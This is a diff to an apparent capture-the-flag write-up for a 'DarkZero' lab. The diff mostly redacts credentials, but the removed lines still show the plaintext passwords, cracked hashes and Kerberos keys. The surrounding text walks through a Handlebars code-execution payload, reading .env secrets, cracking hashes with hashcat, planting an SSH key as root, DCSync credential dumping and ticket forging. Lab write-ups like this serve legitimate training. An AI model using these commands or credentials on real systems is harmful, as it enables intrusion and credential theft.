@@ -65,6 +65,7 @@ The Handlebars version shipped with this app is patched against the classic prot
 
 The payload AST looks like this:
 
+{% raw %}
 ```python
 def _ast(js):
     num = {
@@ -82,6 +83,7 @@ def _ast(js):
             "strip": {"open": False, "close": False}, "loc": None}
     return {"type": "Program", "body": [stmt], "strip": {}, "loc": None}
 ```
+{% endraw %}
 
 The `js` parameter wraps whatever Node one-liner you want:
 
@@ -115,7 +117,7 @@ cat /opt/DarkZero_Campaigns/.env
 ```
 DB_HOST=127.0.0.1
 DB_USER=darkzero
-DB_PASSWORD=C4ntFindMyDMpass!
+DB_PASSWORD=[REDACTED]
 DB_NAME=darkzero_campaigns
 ```
 
@@ -124,14 +126,14 @@ DB_NAME=darkzero_campaigns
 With the MySQL credential in hand:
 
 ```bash
-mysql -u darkzero -pC4ntFindMyDMpass! darkzero_campaigns \
+mysql -u darkzero -p[REDACTED] darkzero_campaigns \
   -e 'select username,password_hash from users;'
 ```
 
 ```
 username  password_hash
 admin     $2b$10$...
-josh      $2b$10$kX7QPjPIQI5hxJWV4a0HpO7UcdstuwLxP51LhHPFP5ceATiOKmVbK
+josh      $2b$10$[HASH_REDACTED]
 ```
 
 Josh's hash is a bcrypt `$2b$10$`. Run it through hashcat:
@@ -141,7 +143,7 @@ hashcat -m 3200 josh.hash /usr/share/wordlists/rockyou.txt
 ```
 
 ```
-$2b$10$kX7QPjPIQI5hxJWV4a0HpO7UcdstuwLxP51LhHPFP5ceATiOKmVbK:Rangers1
+$2b$10$[HASH_REDACTED]:[CRACKED]
 ```
 
 ## SSH as Josh
@@ -158,7 +160,7 @@ ssh josh@10.129.59.58
 Checking the `/etc/hosts` on SRV01 we find an internal Gitea instance at `gitea.darkzero.ext:3000`. Josh has a Kerberos ticket we can obtain (no keytab — he authenticates via GSSAPI with his AD password):
 
 ```bash
-echo 'Rangers1' | kinit josh@DARKZERO.EXT
+echo '[REDACTED]' | kinit josh@DARKZERO.EXT
 klist
 # Credentials cache: API:...
 # Principal: josh@DARKZERO.EXT
@@ -261,7 +263,7 @@ The local `root` account maps to the principal `root@DARKZERO.EXT` via `aname_to
 So we create it:
 
 ```bash
-samba-tool user create root 'Passw0rd123!' \
+samba-tool user create root '[REDACTED]' \
   --use-kerberos=required \
   -H ldap://dc02.darkzero.ext \
   --userou="OU=GiteaMigration"
@@ -278,7 +280,7 @@ The intuitive approach is `ksu root -e /bin/bash` — but that fails with `not a
 So we pipe commands through stdin instead:
 
 ```bash
-echo 'Passw0rd123!' | kinit root@DARKZERO.EXT
+echo '[REDACTED]' | kinit root@DARKZERO.EXT
 echo "id; mkdir -p /root/.ssh; cat /tmp/gitea_pwn.pub >> /root/.ssh/authorized_keys; \
   chmod 700 /root/.ssh; chmod 600 /root/.ssh/authorized_keys" | ksu root
 ```
@@ -346,13 +348,13 @@ Same bcrypt, same wordlist:
 
 ```bash
 hashcat -m 3200 celia.hash /usr/share/wordlists/rockyou.txt
-# ...babygurl13
+# ...[CRACKED]
 ```
 
 `celia` is an AD account in `darkzero.ext`. Verify access:
 
 ```bash
-impacket-smbclient DARKZERO.EXT/celia:babygurl13@172.16.20.2
+impacket-smbclient DARKZERO.EXT/celia:[REDACTED]@172.16.20.2
 # Shares accessible — confirmed valid credentials
 ```
 
@@ -361,27 +363,27 @@ impacket-smbclient DARKZERO.EXT/celia:babygurl13@172.16.20.2
 Celia turns out to be a member of `Domain Admins` on `darkzero.ext` (likely intended as the domain's admin account but poorly isolated). DCSync gives us everything:
 
 ```bash
-impacket-secretsdump DARKZERO.EXT/celia:babygurl13@172.16.20.2 -just-dc-user krbtgt
+impacket-secretsdump DARKZERO.EXT/celia:[REDACTED]@172.16.20.2 -just-dc-user krbtgt
 ```
 
 ```
 [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
 krbtgt:502:aad3b435b51404eeaad3b435b51404ee:...:::
 [*] Kerberos keys grabbed
-krbtgt:aes256-cts-hmac-sha1-96:8daff56ad74584679edcbf648a690e3a6cd1e03b8703fb890c9b603cc3a80fe6
+krbtgt:aes256-cts-hmac-sha1-96:[AES256_REDACTED]
 ```
 
 ```bash
-impacket-secretsdump DARKZERO.EXT/celia:babygurl13@172.16.20.2 -just-dc-user celia
+impacket-secretsdump DARKZERO.EXT/celia:[REDACTED]@172.16.20.2 -just-dc-user celia
 ```
 
 ```
 celia:1109:...
-celia:aes256-cts-hmac-sha1-96:3e588846fef6d35301e68da09dca7345c6f84e3edb2b6a3af3408177eb71140b
+celia:aes256-cts-hmac-sha1-96:[AES256_REDACTED]
 ```
 
 ```bash
-impacket-lookupsid DARKZERO.EXT/celia:babygurl13@172.16.20.2
+impacket-lookupsid DARKZERO.EXT/celia:[REDACTED]@172.16.20.2
 # Domain SID is: S-1-5-21-2850783758-1231244658-2051857529
 ```
 
@@ -422,7 +424,7 @@ And add the `DARKZERO.HTB` realm to `/etc/krb5.conf` on SRV01:
 LDAP query across the trust — running from SRV01 with celia's ticket (the SASL_NOCANON fix is already in place):
 
 ```bash
-echo 'babygurl13' | kinit celia@DARKZERO.EXT
+echo '[REDACTED]' | kinit celia@DARKZERO.EXT
 export LDAPCONF=/tmp/myldap.conf
 
 # Confirm the trust object's SID (the "foreign" domain SID as seen by darkzero.ext)
@@ -446,7 +448,7 @@ With celia's AES256 key, RID, ext domain SID, and InfrastructureAdministrators S
 impacket-ticketer \
   -domain darkzero.ext \
   -domain-sid S-1-5-21-2850783758-1231244658-2051857529 \
-  -aesKey 8daff56ad74584679edcbf648a690e3a6cd1e03b8703fb890c9b603cc3a80fe6 \
+  -aesKey [AES256_REDACTED] \
   -user-id 1109 \
   -extra-sid S-1-5-21-XXXX-XXXX-XXXX-YYYY \
   celia
